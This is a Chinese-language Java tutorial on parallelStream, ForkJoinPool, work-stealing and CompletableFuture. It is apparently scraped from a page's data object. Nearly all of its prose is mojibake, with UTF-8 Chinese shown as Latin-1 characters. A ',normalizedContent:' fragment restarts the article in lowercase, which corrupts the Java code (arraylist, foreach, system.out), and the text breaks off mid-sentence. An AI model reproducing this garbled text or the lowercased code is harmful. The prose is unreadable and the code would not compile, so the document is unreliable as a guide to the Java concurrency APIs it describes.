ç°å¨æææçä¸ç¹æ¯ï¼å¨ä¸ä¸ª parallel stream å¤çä¸­å¹¶ä¸ä¸å®æ¯é»å¡è°ç¨ä¼æå»¶ç¨åºçæ§è½ãä»»ä½è¢«ç¨äºæ å°å¨ä¸ä¸ªéåä¸çé¿æ¶é´è¿è¡çå½æ°é½ä¼äº§çåæ ·çé®é¢.\n\næ­£å¦æä»¬ä¸é¢é£ä¸ªåå­çæåµåæå¾ç¥ï¼lambda çæ§è¡å¹¶ä¸æ¯ç¬é´å®æçï¼ææä½¿ç¨ parallel streams çç¨åºé½æå¯è½æä¸ºé»å¡ç¨åºçæºå¤´ï¼å¹¶ä¸å¨æ§è¡è¿ç¨ä¸­ç¨åºä¸­çå¶ä»é¨åå°æ æ³è®¿é®è¿äº workers, è¿æå³çä»»ä½ä¾èµ parallel streams çç¨åºå¨ä»ä¹å«çä¸è¥¿å ç¨ç common ForkJoinPool æ¶å°ä¼åå¾ä¸å¯é¢ç¥å¹¶ä¸æèå±æº.\n\næä¹æ­£ç¡®ä½¿ç¨ parallelStream\nå¦æä½ æ­£å¨åä¸ä¸ªå¶ä»å°æ¹é½æ¯åçº¿ç¨çç¨åºå¹¶ä¸åç¡®å°ç¥éä»ä¹æ¶åä½ åºè¯¥è¦ä½¿ç¨ parallel streamsï¼è¿æ ·çè¯ä½ å¯è½ä¼è§å¾è¿ä¸ªé®é¢æä¸ç¹è¤æµãç¶èï¼æä»¬å¾å¤äººæ¯å¨å¤ç web åºç¨ãåç§ä¸åçæ¡æ¶ä»¥åééçº§åºç¨æå¡ãä¸ä¸ªæå¡å¨æ¯ææ ·è¢«è®¾è®¡æä¸ä¸ªå¯ä»¥æ¯æå¤ç§ç¬ç«åºç¨çä¸»æºçï¼è°ç¥éå¢ï¼ç»ä½ ä¸ä¸ªå¯ä»¥å¹¶è¡çå´ä¸è½æ§å¶è¾å¥ç parallel stream.\n\nå¾æ±æ­ï¼è¯·åè°æç¨çæ æ³¨ [æä¹æ­£ç¡®ä½¿ç¨ parallelStream], å ä¸ºç®åä¸ºæ­¢æä¹æ²¡æåç°ä¸ä¸ªå¥½çæ¹å¼æ¥è®©æçæ­£çæ­£ç¡®ä½¿ç¨ parallelStream. ä¸é¢çç½ä¸åçä¸¤ç§æ¹å¼:\n\nä¸ç§æ¹å¼æ¯éå¶ ForkJoinPool æä¾çå¹¶è¡æ°ãå¯ä»¥éè¿ä½¿ç¨ - Djava.util.concurrent.ForkJoinPool.common.parallelism=1 æ¥éå¶çº¿ç¨æ± çå¤§å°ä¸º 1ãä¸åä»å¹¶è¡åä¸­å¾å°å¥½å¤å¯ä»¥æç»éè¯¯çä½¿ç¨å® (å¶å®è¿ä¸ªæ¹å¼è¿æ¯æç¹æç¬çï¼æ¢ç¶è¿æ ·æé£æè¿ä¸å¦ä¸å»ä½¿ç¨å¹¶è¡æµ)ã\n\nå¦ä¸ç§æ¹å¼å°±æ¯ï¼ä¸ä¸ªè¢«ç§°ä¸ºå·¥ä½åºçå¯ä»¥è®© ForkJoinPool å¹³è¡æ¾ç½®ç parallelStream () å®ç°ãä¸å¹¸çæ¯ç°å¨ç JDK è¿æ²¡æå®ç°ã\n\nParallel streams æ¯æ æ³é¢æµçï¼èä¸æ³è¦æ­£ç¡®å°ä½¿ç¨å®æäºæ£æãå ä¹ä»»ä½ parallel streams çä½¿ç¨é½ä¼å½±åç¨åºä¸­æ å³é¨åçæ§è½ï¼èä¸æ¯ä¸ç§æ æ³é¢æµçæ¹å¼ããä½æ¯å¨è°ç¨ stream.parallel () æè parallelStream () æ¶åå¨æçä»£ç éä¹åæä»ç¶ä¼éæ°å®¡è§ä¸éä»ç»æçç¨åºç©¶ç«ä¼å¸¦æ¥ä»ä¹é®é¢ï¼ä»è½æå¤å¤§çæåï¼æ¯å¦æä½¿ç¨ä»çæä¹.\n\nstream or parallelStreamï¼\nä¸é¢æä»¬ä¹çå°äº parallelStream æå¸¦æ¥çéæ£åå¥½å¤ï¼é£ä¹ï¼å¨ä» stream å parallelStream æ¹æ³ä¸­è¿è¡éæ©æ¶ï¼æä»¬å¯ä»¥èèä»¥ä¸å ä¸ªé®é¢ï¼\n\n>  1. æ¯å¦éè¦å¹¶è¡ï¼\n>  2. ä»»å¡ä¹é´æ¯å¦æ¯ç¬ç«çï¼æ¯å¦ä¼å¼èµ·ä»»ä½ç«ææ¡ä»¶ï¼\n>  3. ç»ææ¯å¦åå³äºä»»å¡çè°ç¨é¡ºåºï¼\n\nå¯¹äºé®é¢ 1ï¼å¨åç­è¿ä¸ªé®é¢ä¹åï¼ä½ éè¦å¼æ¸æ¥ä½ è¦è§£å³çé®é¢æ¯ä»ä¹ï¼æ°æ®éæå¤å¤§ï¼è®¡ç®çç¹ç¹æ¯ä»ä¹ï¼å¹¶ä¸æ¯ææçé®é¢é½éåä½¿ç¨å¹¶åç¨åºæ¥æ±è§£ï¼æ¯å¦å½æ°æ®éä¸å¤§æ¶ï¼é¡ºåºæ§è¡å¾å¾æ¯å¹¶è¡æ§è¡æ´å¿«ãæ¯ç«ï¼åå¤çº¿ç¨æ± åå¶å®ç¸å³èµæºä¹æ¯éè¦æ¶é´çãä½æ¯ï¼å½ä»»å¡æ¶åå° I/O æä½å¹¶ä¸ä»»å¡ä¹é´ä¸äºç¸ä¾èµæ¶ï¼é£ä¹å¹¶è¡åå°±æ¯ä¸ä¸ªä¸éçéæ©ãéå¸¸èè¨ï¼å°è¿ç±»ç¨åºå¹¶è¡åä¹åï¼æ§è¡éåº¦ä¼æåå¥½å ä¸ªç­çº§ã\n\nå¯¹äºé®é¢ 2ï¼å¦æä»»å¡ä¹é´æ¯ç¬ç«çï¼å¹¶ä¸ä»£ç ä¸­ä¸æ¶åå°å¯¹åä¸ä¸ªå¯¹è±¡çæä¸ªç¶ææèæä¸ªåéçæ´æ°æä½ï¼é£ä¹å°±è¡¨æä»£ç æ¯å¯ä»¥è¢«å¹¶è¡åçã\n\nå¯¹äºé®é¢ 3ï¼ç±äºå¨å¹¶è¡ç¯å¢ä¸­ä»»å¡çæ§è¡é¡ºåºæ¯ä¸ç¡®å®çï¼å æ­¤å¯¹äºä¾èµäºé¡ºåºçä»»å¡èè¨ï¼å¹¶è¡åä¹è®¸ä¸è½ç»åºæ­£ç¡®çç»æã\n\n\n# CompletableFuture\n\nCompletableFuture æ¯ä¸ä¸ªå¼æ­¥ç¼ç¨ apiï¼ç¨çæ¯ forkjoin ççº¿ç¨å®ç°ï¼å¯ä»¥å¸®æä»¬è¾¾å°ä½¿ç¨å¤æ ¸å¤çä»»å¡çææãCompletableFuture æä¾äº supplyAsync å runAsync ä¸¤ä¸ªæ¹æ³ï¼supplyAsync å¼æ­¥å®æåè¿åä¸ä¸ªå·ä½çæ°æ®ï¼runAsync ç´æ¥å°±æ¯å¼æ­¥æ§è¡ï¼æ§è¡å®ä¾¿ç»æäºãæä»¬æ¥ççç®åçç¨æ³ï¼\n\n * supplyAsync ().thenCompose () æ¹æ³åè®¸ä½ å¯¹ä¸¤ä¸ªå¼æ­¥æä½è¿è¡æµæ°´çº¿ï¼ç¬¬ä¸ä¸ªæä½å®ææ¶ï¼å°å¶ç»æä½ä¸ºåæ°ä¼ éç»ç¬¬äºä¸ªæä½\n * supplyAsync ().thenCombine () ä½ éè¦å°ä¸¤ä¸ªå®å¨ä¸ç¸å¹²ç CompletableFuture å¯¹è±¡çç»ææ´åèµ·æ¥ï¼èä¸ä½ ä¹ä¸å¸æç­å°ç¬¬ä¸ä¸ªä»»å¡å®å¨ç»ææå¼å§ç¬¬äºé¡¹ä»»å¡\n * supplyAsync ().thenAccept () å®æ¥æ¶ CompletableFuture æ§è¡å®æ¯åçè¿åå¼ååæ°\n * supplyAsync ().thenApply () è¯¥æ¹æ³ä¼ç­ CompletableFuture æ§è¡å®ç¬¬ä¸ä¸ªç»æ å°±è°ç¨å¶æ§è¡.',normalizedContent:'# parallelstream å completablefuture å®æ\n\n\n# parallelstream\n\nabout stream\nä»ä¹æ¯æµï¼\n\nstream æ¯ java8 ä¸­æ°å¢å çä¸ä¸ªç¹æ§ï¼è¢« java ç¿ç»ç§°ä¸ºæµ.\n\nstream ä¸æ¯éååç´ ï¼å®ä¸æ¯æ°æ®ç»æå¹¶ä¸ä¿å­æ°æ®ï¼å®æ¯æå³ç®æ³åè®¡ç®çï¼å®æ´åä¸ä¸ªé«çº§çæ¬ç iteratorãåå§çæ¬ç iteratorï¼ç¨æ·åªè½æ¾å¼å°ä¸ä¸ªä¸ä¸ªéååç´ å¹¶å¯¹å¶æ§è¡æäºæä½ï¼é«çº§çæ¬ç streamï¼ç¨æ·åªè¦ç»åºéè¦å¯¹å¶åå«çåç´ æ§è¡ä»ä¹æä½ï¼æ¯å¦ âè¿æ»¤æé¿åº¦å¤§äº 10 çå­ç¬¦ä¸²âãâè·åæ¯ä¸ªå­ç¬¦ä¸²çé¦å­æ¯â ç­ï¼stream ä¼éå¼å°å¨åé¨è¿è¡éåï¼ååºç¸åºçæ°æ®è½¬æ¢ã\n\nstream å°±å¦åä¸ä¸ªè¿­ä»£å¨ï¼iteratorï¼ï¼ååï¼ä¸å¯å¾å¤ï¼æ°æ®åªè½éåä¸æ¬¡ï¼éåè¿ä¸æ¬¡åå³ç¨å°½äºï¼å°±å¥½æ¯æµæ°´ä»é¢åæµè¿ï¼ä¸å»ä¸å¤è¿ã\n\nèåè¿­ä»£å¨åä¸åçæ¯ï¼stream å¯ä»¥å¹¶è¡åæä½ï¼è¿­ä»£å¨åªè½å½ä»¤å¼å°ãä¸²è¡åæä½ãé¡¾åæä¹ï¼å½ä½¿ç¨ä¸²è¡æ¹å¼å»éåæ¶ï¼æ¯ä¸ª item è¯»å®ååè¯»ä¸ä¸ä¸ª itemãèä½¿ç¨å¹¶è¡å»éåæ¶ï¼æ°æ®ä¼è¢«åæå¤ä¸ªæ®µï¼å¶ä¸­æ¯ä¸ä¸ªé½å¨ä¸åççº¿ç¨ä¸­å¤çï¼ç¶åå°ç»æä¸èµ·è¾åºãstream çå¹¶è¡æä½ä¾èµäº java7 ä¸­å¼å¥ç fork/join æ¡æ¶ï¼jsr166yï¼æ¥æåä»»å¡åå éå¤çè¿ç¨ãjava çå¹¶è¡ api æ¼ååç¨åºæ¬å¦ä¸ï¼\n\n> 1.0-1.4 ä¸­ç java.lang.thread\n> 5.0 ä¸­ç java.util.concurrent\n> 6.0 ä¸­ç phasers ç­\n> 7.0 ä¸­ç fork/join æ¡æ¶\n> 8.0 ä¸­ç lambda\n\nstream çå¦å¤ä¸å¤§ç¹ç¹æ¯ï¼æ°æ®æºæ¬èº«å¯ä»¥æ¯æ éçã\n\nparallelstream æ¯ä»ä¹\nparallelstream å¶å®å°±æ¯ä¸ä¸ªå¹¶è¡æ§è¡çæµãå®éè¿é»è®¤ç forkjoinpool, å¯è½æé«ä½ çå¤çº¿ç¨ä»»å¡çéåº¦.\n\nparallelstream çä½ç¨\nstream å·æå¹³è¡å¤çè½åï¼å¤ççè¿ç¨ä¼åèæ²»ä¹ï¼ä¹å°±æ¯å°ä¸ä¸ªå¤§ä»»å¡ååæå¤ä¸ªå°ä»»å¡ï¼è¿è¡¨ç¤ºæ¯ä¸ªä»»å¡é½æ¯ä¸ä¸ªæä½ï¼å æ­¤åä»¥ä¸çç¨å¼çæ®µï¼\n\nlist<integer> numbers = arrays.aslist(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelstream()\n       .foreach(out::println); \n\n\n1\n2\n3\n\n\nä½ å¾å°çå±ç¤ºé¡ºåºä¸ä¸å®ä¼æ¯ 1ã2ã3ã4ã5ã6ã7ã8ã9ï¼èå¯è½æ¯ä»»æçé¡ºåºï¼å°± foreach () è¿ä¸ªæä½ä¾è®²ï¼å¦æå¹³è¡å¤çæ¶ï¼å¸ææåé¡ºåºæ¯æç§åæ¥ stream çæ°æ®é¡ºåºï¼é£å¯ä»¥è°ç¨ foreachordered ()ãä¾å¦ï¼\n\nlist<integer> numbers = arrays.aslist(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelstream()\n       .foreachordered(out::println);\n\n\n1\n2\n3\n\n\næ³¨æï¼å¦æ foreachordered () ä¸­é´æå¶ä»å¦ filter () çä¸­ä»æä½ï¼ä¼è¯çå¹³è¡åå¤çï¼ç¶åæç» foreachordered () ä¼ä»¥åæ°æ®é¡ºåºå¤çï¼å æ­¤ï¼ä½¿ç¨ foreachordered () è¿ç±»çæåºå¤çï¼å¯è½ä¼ï¼æå®å¨å¤±å»ï¼å¤±å»å¹³è¡åçä¸äºä¼å¿ï¼å®éä¸ä¸­ä»æä½äº¦æå¯è½å¦æ­¤ï¼ä¾å¦ sorted () æ¹æ³ã\n\nparallelstream èåçç·äººï¼forkjoinpool\nè¦æ³æ·±å¥çç ç©¶ parallelstream ä¹åï¼é£ä¹æä»¬å¿é¡»åäºè§£ forkjoin æ¡æ¶å forkjoinpool. æ¬ææ¨å¨ parallelstream, ä½å ä¸ºä¸¤ç§å³ç³»çå¯ï¼æå¨æ­¤ç®åä»ç»ä¸ä¸ forkjoinpool, å¦æå´è¶£å¯ä»¥æ´æ·±å¥çå»äºè§£ä¸ forkjoin***(å½ç¶ï¼å¦æä½ æ³çæ­£çæé parallelstream, é£ä¹ä½ ä¾ç¶éè¦åæé forkjoinpool).*\n\nforkjoin æ¡æ¶æ¯ä» jdk7 ä¸­æ°ç¹æ§ï¼å®å threadpoolexecutor ä¸æ ·ï¼ä¹å®ç°äº executor å executorservice æ¥å£ãå®ä½¿ç¨äºä¸ä¸ªæ ééåæ¥ä¿å­éè¦æ§è¡çä»»å¡ï¼èçº¿ç¨çæ°éåæ¯éè¿æé å½æ°ä¼ å¥ï¼å¦ææ²¡æåæé å½æ°ä¸­ä¼ å¥å¸æççº¿ç¨æ°éï¼é£ä¹å½åè®¡ç®æºå¯ç¨ç cpu æ°éä¼è¢«è®¾ç½®ä¸ºçº¿ç¨æ°éä½ä¸ºé»è®¤å¼ã\n\nforkjoinpool ä¸»è¦ç¨æ¥ä½¿ç¨åæ²»æ³ (divide-and-conquer algorithm) æ¥è§£å³é®é¢ãå¸åçåºç¨æ¯å¦å¿«éæåºç®æ³ãè¿éçè¦ç¹å¨äºï¼forkjoinpool éè¦ä½¿ç¨ç¸å¯¹å°ççº¿ç¨æ¥å¤çå¤§éçä»»å¡ãæ¯å¦è¦å¯¹ 1000 ä¸ä¸ªæ°æ®è¿è¡æåºï¼é£ä¹ä¼å°è¿ä¸ªä»»å¡åå²æä¸¤ä¸ª 500 ä¸çæåºä»»å¡åä¸ä¸ªéå¯¹è¿ä¸¤ç» 500 ä¸æ°æ®çåå¹¶ä»»å¡ãä»¥æ­¤ç±»æ¨ï¼å¯¹äº 500 ä¸çæ°æ®ä¹ä¼ååºåæ ·çåå²å¤çï¼å°æåä¼è®¾ç½®ä¸ä¸ªéå¼æ¥è§å®å½æ°æ®è§æ¨¡å°å¤å°æ¶ï¼åæ­¢è¿æ ·çåå²å¤çãæ¯å¦ï¼å½åç´ çæ°éå°äº 10 æ¶ï¼ä¼åæ­¢åå²ï¼è½¬èä½¿ç¨æå¥æåºå¯¹å®ä»¬è¿è¡æåºãé£ä¹å°æåï¼ææçä»»å¡å èµ·æ¥ä¼æå¤§æ¦ 2000000 + ä¸ªãé®é¢çå³é®å¨äºï¼å¯¹äºä¸ä¸ªä»»å¡èè¨ï¼åªæå½å®ææçå­ä»»å¡å®æä¹åï¼å®æè½å¤è¢«æ§è¡ã\n\næä»¥å½ä½¿ç¨ threadpoolexecutor æ¶ï¼ä½¿ç¨åæ²»æ³ä¼å­å¨é®é¢ï¼å ä¸º threadpoolexecutor ä¸­ççº¿ç¨æ æ³åä»»å¡éåä¸­åæ·»å ä¸ä¸ªä»»å¡å¹¶ä¸å¨ç­å¾è¯¥ä»»å¡å®æä¹ååç»§ç»­æ§è¡ãèä½¿ç¨ forkjoinpool æ¶ï¼å°±è½å¤è®©å¶ä¸­ççº¿ç¨åå»ºæ°çä»»å¡ï¼å¹¶æèµ·å½åçä»»å¡ï¼æ­¤æ¶çº¿ç¨å°±è½å¤ä»éåä¸­éæ©å­ä»»å¡æ§è¡ã\n\né£ä¹ä½¿ç¨ threadpoolexecutor æè forkjoinpoolï¼ä¼æä»ä¹æ§è½çå·®å¼å¢ï¼\né¦åï¼ä½¿ç¨ forkjoinpool è½å¤ä½¿ç¨æ°éæéççº¿ç¨æ¥å®æéå¸¸å¤çå·æç¶å­å³ç³»çä»»å¡ï¼æ¯å¦ä½¿ç¨ 4 ä¸ªçº¿ç¨æ¥å®æè¶è¿ 200 ä¸ä¸ªä»»å¡ãä½æ¯ï¼ä½¿ç¨ threadpoolexecutor æ¶ï¼æ¯ä¸å¯è½å®æçï¼å ä¸º threadpoolexecutor ä¸­ç thread æ æ³éæ©ä¼åæ§è¡å­ä»»å¡ï¼éè¦å®æ 200 ä¸ä¸ªå·æç¶å­å³ç³»çä»»å¡æ¶ï¼ä¹éè¦ 200 ä¸ä¸ªçº¿ç¨ï¼æ¾ç¶è¿æ¯ä¸å¯è¡çã\n\nå·¥ä½çªåç®æ³\nforkjoin ææ ¸å¿çå°æ¹å°±æ¯å©ç¨äºç°ä»£ç¡¬ä»¶è®¾å¤å¤æ ¸ï¼å¨ä¸ä¸ªæä½æ¶åä¼æç©ºé²ç cpu, é£ä¹å¦ä½å©ç¨å¥½è¿ä¸ªç©ºé²ç cpu å°±æäºæé«æ§è½çå³é®ï¼èè¿éæä»¬è¦æå°çå·¥ä½çªåï¼work-stealingï¼ç®æ³å°±æ¯æ´ä¸ª forkjion æ¡æ¶çæ ¸å¿çå¿µï¼å·¥ä½çªåï¼work-stealingï¼ç®æ³æ¯ææä¸ªçº¿ç¨ä»å¶ä»éåéçªåä»»å¡æ¥æ§è¡ã\n\né£ä¹ä¸ºä»ä¹éè¦ä½¿ç¨å·¥ä½çªåç®æ³å¢ï¼\nåå¦æä»¬éè¦åä¸ä¸ªæ¯è¾å¤§çä»»å¡ï¼æä»¬å¯ä»¥æè¿ä¸ªä»»å¡åå²ä¸ºè¥å¹²äºä¸ä¾èµçå­ä»»å¡ï¼ä¸ºäºåå°çº¿ç¨é´çç«äºï¼äºæ¯æè¿äºå­ä»»å¡åå«æ¾å°ä¸åçéåéï¼å¹¶ä¸ºæ¯ä¸ªéååå»ºä¸ä¸ªåç¬ççº¿ç¨æ¥æ§è¡éåéçä»»å¡ï¼çº¿ç¨åéåä¸ä¸å¯¹åºï¼æ¯å¦ a çº¿ç¨è´è´£å¤ç a éåéçä»»å¡ãä½æ¯æççº¿ç¨ä¼åæèªå·±éåéçä»»å¡å¹²å®ï¼èå¶ä»çº¿ç¨å¯¹åºçéåéè¿æä»»å¡ç­å¾å¤çãå¹²å®æ´»ççº¿ç¨ä¸å¶ç­çï¼ä¸å¦å»å¸®å¶ä»çº¿ç¨å¹²æ´»ï¼äºæ¯å®å°±å»å¶ä»çº¿ç¨çéåéçªåä¸ä¸ªä»»å¡æ¥æ§è¡ãèå¨è¿æ¶å®ä»¬ä¼è®¿é®åä¸ä¸ªéåï¼æä»¥ä¸ºäºåå°çªåä»»å¡çº¿ç¨åè¢«çªåä»»å¡çº¿ç¨ä¹é´çç«äºï¼éå¸¸ä¼ä½¿ç¨åç«¯éåï¼è¢«çªåä»»å¡çº¿ç¨æ°¸è¿ä»åç«¯éåçå¤´é¨æ¿ä»»å¡æ§è¡ï¼èçªåä»»å¡ççº¿ç¨æ°¸è¿ä»åç«¯éåçå°¾é¨æ¿ä»»å¡æ§è¡ã\n\n> å·¥ä½çªåç®æ³çä¼ç¹æ¯ååå©ç¨çº¿ç¨è¿è¡å¹¶è¡è®¡ç®ï¼å¹¶åå°äºçº¿ç¨é´çç«äºï¼å¶ç¼ºç¹æ¯å¨æäºæåµä¸è¿æ¯å­å¨ç«äºï¼æ¯å¦åç«¯éåéåªæä¸ä¸ªä»»å¡æ¶ãå¹¶ä¸æ¶èäºæ´å¤çç³»ç»èµæºï¼æ¯å¦åå»ºå¤ä¸ªçº¿ç¨åå¤ä¸ªåç«¯éåã\n\nç¨ç forkjion çç¼åæ¥ç parallelstreams\nä¸æä¸­å·²ç»æå°äºå¨ java 8 å¼å¥äºèªå¨å¹¶è¡åçæ¦å¿µãå®è½å¤è®©ä¸é¨å java ä»£ç èªå¨å°ä»¥å¹¶è¡çæ¹å¼æ§è¡ï¼ä¹å°±æ¯æä»¬ä½¿ç¨äº forkjoinpool ç parallelstreamã\n\njava 8 ä¸º forkjoinpool æ·»å äºä¸ä¸ªéç¨çº¿ç¨æ± ï¼è¿ä¸ªçº¿ç¨æ± ç¨æ¥å¤çé£äºæ²¡æè¢«æ¾å¼æäº¤å°ä»»ä½çº¿ç¨æ± çä»»å¡ãå®æ¯ forkjoinpool ç±»åä¸çä¸ä¸ªéæåç´ ï¼å®æ¥æçé»è®¤çº¿ç¨æ°éç­äºè¿è¡è®¡ç®æºä¸çå¤çå¨æ°éãå½è°ç¨ arrays ç±»ä¸æ·»å çæ°æ¹æ³æ¶ï¼èªå¨å¹¶è¡åå°±ä¼åçãæ¯å¦ç¨æ¥æåºä¸ä¸ªæ°ç»çå¹¶è¡å¿«éæåºï¼ç¨æ¥å¯¹ä¸ä¸ªæ°ç»ä¸­çåç´ è¿è¡å¹¶è¡éåãèªå¨å¹¶è¡åä¹è¢«è¿ç¨å¨ java 8 æ°æ·»å ç stream api ä¸­ã\n\næ¯å¦ä¸é¢çä»£ç ç¨æ¥éååè¡¨ä¸­çåç´ å¹¶æ§è¡éè¦çæä½ï¼\n\n    list<userinfo> userinfolist =\n        daocontainers.getuserinfodao().queryallbylist(new userinfomodel());\n    userinfolist.parallelstream().foreach(redisuserapi::setuseriduserinfo);\n\n\n1\n2\n3\n\n\nå¯¹äºåè¡¨ä¸­çåç´ çæä½é½ä¼ä»¥å¹¶è¡çæ¹å¼æ§è¡ãforeach æ¹æ³ä¼ä¸ºæ¯ä¸ªåç´ çè®¡ç®æä½åå»ºä¸ä¸ªä»»å¡ï¼è¯¥ä»»å¡ä¼è¢«åæä¸­æå°ç forkjoinpool ä¸­çéç¨çº¿ç¨æ± å¤çãä»¥ä¸çå¹¶è¡è®¡ç®é»è¾å½ç¶ä¹å¯ä»¥ä½¿ç¨ threadpoolexecutor å®æï¼ä½æ¯å°±ä»£ç çå¯è¯»æ§åä»£ç éèè¨ï¼ä½¿ç¨ forkjoinpool ææ¾æ´èä¸ç­¹ã\n\nå¯¹äº forkjoinpool éç¨çº¿ç¨æ± ççº¿ç¨æ°éï¼éå¸¸ä½¿ç¨é»è®¤å¼å°±å¯ä»¥äºï¼å³è¿è¡æ¶è®¡ç®æºçå¤çå¨æ°éãæè¿éæä¾äºä¸ä¸ªç¤ºä¾çä»£ç è®©ä½ äºè§£ jvm æä½¿ç¨ç forkjoinpool ççº¿ç¨æ°éï¼ä½ å¯ä»¥å¯ä»¥éè¿è®¾ç½®ç³»ç»å±æ§ï¼-djava.util.concurrent.forkjoinpool.common.parallelism=n ï¼n ä¸ºçº¿ç¨æ°éï¼, æ¥è°æ´ forkjoinpool ççº¿ç¨æ°éï¼å¯ä»¥å°è¯è°æ´æä¸åçåæ°æ¥è§å¯æ¯æ¬¡çè¾åºç»æ:\n\nimport java.util.arraylist;\nimport java.util.list;\nimport java.util.set;\nimport java.util.concurrent.copyonwritearrayset;\nimport java.util.concurrent.countdownlatch;\n\n/**\n * @description è¿æ¯ä¸ä¸ªç¨æ¥è®©ä½ æ´å çæparallelstreamçåççå®å\n * @version v1.0\n */\npublic class app {\n    public static void main(string[] args) throws exception {\n        system.out.println("hello world!");\n        // æé ä¸ä¸ª10000ä¸ªåç´ çéå\n        list<integer> list = new arraylist<>();\n        for (int i = 0; i < 10000; i++) {\n            list.add(i);\n        }\n        // ç»è®¡å¹¶è¡æ§è¡listççº¿ç¨\n        set<thread> threadset = new copyonwritearrayset<>();\n        // å¹¶è¡æ§è¡\n        list.parallelstream().foreach(integer -> {\n            thread thread = thread.currentthread();\n            // system.out.println(thread);\n            // ç»è®¡å¹¶è¡æ§è¡listççº¿ç¨\n            threadset.add(thread);\n        });\n        system.out.println("threadsetä¸å±æ" + threadset.size() + "ä¸ªçº¿ç¨");\n        system.out.println("ç³»ç»ä¸ä¸ªæ"+runtime.getruntime().availableprocessors()+"ä¸ªcpu");\n        list<integer> list1 = new arraylist<>();\n        list<integer> list2 = new arraylist<>();\n        for (int i = 0; i < 100000; i++) {\n            list1.add(i);\n            list2.add(i);\n        }\n        set<thread> threadsettwo = new copyonwritearrayset<>();\n        countdownlatch countdownlatch = new countdownlatch(2);\n        thread threada = new thread(() -> {\n            list1.parallelstream().foreach(integer -> {\n                thread thread = thread.currentthread();\n                // system.out.println("list1" + thread);\n                threadsettwo.add(thread);\n            });\n            countdownlatch.countdown();\n        });\n        thread threadb = new thread(() -> {\n            list2.parallelstream().foreach(integer -> {\n                thread thread = thread.currentthread();\n                // system.out.println("list2" + thread);\n                threadsettwo.add(thread);\n            });\n            countdownlatch.countdown();\n        });\n\n        threada.start();\n        threadb.start();\n        countdownlatch.await();\n        system.out.print("threadsettwoä¸å±æ" + threadsettwo.size() + "ä¸ªçº¿ç¨");\n\n        system.out.println("---------------------------");\n        system.out.println(threadset);\n        system.out.println(threadsettwo);\n        system.out.println("---------------------------");\n        threadsettwo.addall(threadset);\n        system.out.println(threadsettwo);\n        system.out.println("threadsettwoä¸å±æ" + threadsettwo.size() + "ä¸ªçº¿ç¨");\n        system.out.println("ç³»ç»ä¸ä¸ªæ"+runtime.getruntime().availableprocessors()+"ä¸ªcpu");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\nåºç°è¿ç§ç°è±¡çåå æ¯ï¼foreach æ¹æ³ç¨äºä¸äºå°ææãå®ä¼å°æ§è¡ foreach æ¬èº«ççº¿ç¨ä¹ä½ä¸ºçº¿ç¨æ± ä¸­çä¸ä¸ªå·¥ä½çº¿ç¨ãå æ­¤ï¼å³ä½¿å° forkjoinpool çéç¨çº¿ç¨æ± ççº¿ç¨æ°éè®¾ç½®ä¸º 1ï¼å®éä¸ä¹ä¼æ 2 ä¸ªå·¥ä½çº¿ç¨ãå æ­¤å¨ä½¿ç¨ foreach çæ¶åï¼çº¿ç¨æ°ä¸º 1 ç forkjoinpool éç¨çº¿ç¨æ± åçº¿ç¨æ°ä¸º 2 ç threadpoolexecutor æ¯ç­ä»·çã\n\næä»¥å½ forkjoinpool éç¨çº¿ç¨æ± å®ééè¦ 4 ä¸ªå·¥ä½çº¿ç¨æ¶ï¼å¯ä»¥å°å®è®¾ç½®æ 3ï¼é£ä¹å¨è¿è¡æ¶å¯ç¨çå·¥ä½çº¿ç¨å°±æ¯ 4 äºã\nå°ç»:\n\n>  1. å½éè¦å¤çéå½åæ²»ç®æ³æ¶ï¼èèä½¿ç¨ forkjoinpoolã\n>  2. ä»ç»è®¾ç½®ä¸åè¿è¡ä»»å¡ååçéå¼ï¼è¿ä¸ªéå¼å¯¹æ§è½æå½±åã\n>  3. java 8 ä¸­çä¸äºç¹æ§ä¼ä½¿ç¨å° forkjoinpool ä¸­çéç¨çº¿ç¨æ± ãå¨æäºåºåä¸ï¼éè¦è°æ´è¯¥çº¿ç¨æ± çé»è®¤ççº¿ç¨æ°éã\n\nparallelstreams çé·é±\nä¸æä¸­æä»¬å·²ç»çå°äº parallelstream ä»å¼ºå¤§æ æ¯çç¹æ§ï¼ä½è¿éæä»¬å°±è®²åè¯ä½  parallelstreams ä¸æ¯ä¸éæ²¹ï¼èæ¯ä¸æåååï¼å¦æéè¯¯çä½¿ç¨ååå¯è½ä¼¤äººä¼¤å·±.\n\nä»¥ä¸æ¯ä¸ä¸ªæä»¬é¡¹ç®éä½¿ç¨ parallel streams çå¾å¸¸è§çæåµãå¨è¿ä¸ªä¾å­ä¸­ï¼æä»¬æ³åæ¶è°ç¨ä¸åå°åç api ä¸­å¹¶ä¸è·å¾ç¬¬ä¸ä¸ªè¿åçç»æã\n\n    public static string query(string q, list<string> engines) {      optional<string> result = engines.stream().parallel().map((base) -> {\n        string url = base + q;\n        return ws.url(url).get();\n      }).findany();\n      return result.get();\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¯è½æå¾å¤æåå¨ jdk7 ç¨ future éå countdownlatch èªå·±å®ç°çè¿ä¸ªåè½ï¼ä½æ¯ jdk8 çæååºæ¬é½ä¼ç¨ä¸é¢çå®ç°æ¹å¼ï¼é£ä¹èªä¿¡æ·±ç©¶ä¸ä¸ç©¶ç«èªå·±ç¨ future å®ç°çè¿ä¸ªåè½åå©ç¨ jdk8 ç parallelstream æ¥å®ç°è¿ä¸ªåè½æä»ä¹ä¸åç¹å¢ï¼ååå¨åªéå¢ï¼\n\nè®©æä»¬ç»ææèä¸ä¸æ´ä¸ªåè½ç©¶ç«æ¯å¦ä½è¿è½¬çãé¦åæä»¬çéååç´  engines ç± parallelstreams å¹¶è¡çå»è¿è¡ map æä½ (parallelstreams ä½¿ç¨ jvm é»è®¤ç forkjoin æ¡æ¶ççº¿ç¨æ± ç±å½åçº¿ç¨å»æ§è¡å¹¶è¡æä½).\n\nç¶èï¼è¿ééè¦æ³¨æçä¸å°æ¹æ¯æä»¬å¨è°ç¨ç¬¬ä¸æ¹ç api 